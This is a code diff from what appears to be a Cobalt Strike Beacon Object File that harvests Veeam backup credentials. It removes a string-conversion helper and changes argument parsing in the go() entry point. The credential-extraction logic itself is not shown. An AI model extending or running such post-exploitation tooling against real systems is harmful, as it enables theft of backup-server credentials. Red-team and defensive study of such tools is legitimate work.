@@ -48,13 +48,6 @@ void getDBFromRegistry(char*);
 void mapCredentials();
 char* figureOutDbType();
 
-static char* wstr2astr(const wchar_t* w) {
-    int len = WideCharToMultiByte(CP_ACP, 0, w, -1, NULL, 0, NULL, NULL);
-    char* out = (char*)malloc(len);
-    if (out) WideCharToMultiByte(CP_ACP, 0, w, -1, out, len, NULL, NULL);
-    return out;
-}
-
 void go(char * args, int alen) {
     // Exprected args <dbtype> <db name> <exe path> <debug> <veeamone>
     // BeaconPrintf(CALLBACK_OUTPUT, "Running Veeam Creds with args: %s (%d)", args,alen);
@@ -81,9 +74,9 @@ void go(char * args, int alen) {
     int db_name_size;
     
     BeaconDataParse(&parser, args, alen);
-    db_type  = wstr2astr((wchar_t*)BeaconDataExtract(&parser, NULL));
-    db_name  = wstr2astr((wchar_t*)BeaconDataExtract(&parser, &db_name_size));
-    exe_path = wstr2astr((wchar_t*)BeaconDataExtract(&parser, NULL));
+    db_type = BeaconDataExtract(&parser, NULL);
+    db_name = BeaconDataExtract(&parser, &db_name_size);
+    exe_path = BeaconDataExtract(&parser, NULL);
     debug = BeaconDataInt(&parser);
     VeeamOne = BeaconDataInt(&parser);
 
